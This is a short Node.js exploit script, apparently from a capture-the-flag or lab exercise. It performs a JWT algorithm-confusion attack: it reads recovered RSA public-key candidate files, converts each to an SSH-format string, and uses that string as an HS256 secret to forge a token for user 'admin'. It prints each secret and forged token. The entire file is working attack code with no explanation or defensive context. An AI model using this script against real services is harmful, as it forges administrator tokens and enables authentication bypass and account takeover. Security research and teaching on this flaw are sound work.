const fs = require("fs");
const jwt = require("jsonwebtoken");
const sshpk = require("sshpk");

const candidates = ["recover_candidate_1.pem", "recover_candidate_2.pem"];

for (const file of candidates) {
	const pem = fs.readFileSync(file, "utf8");

	const secret = sshpk
		.parseKey(pem, "pem", { filename: "publickey" })
		.toString("ssh");

	const token = jwt.sign(
		{
			sub: 1,
			username: "admin",
		},
		secret,
		{
			algorithm: "HS256",
		},
	);

	console.log("==", file, "==");
	console.log("secret =", JSON.stringify(secret));
	console.log("token  =", token);
	console.log();
}
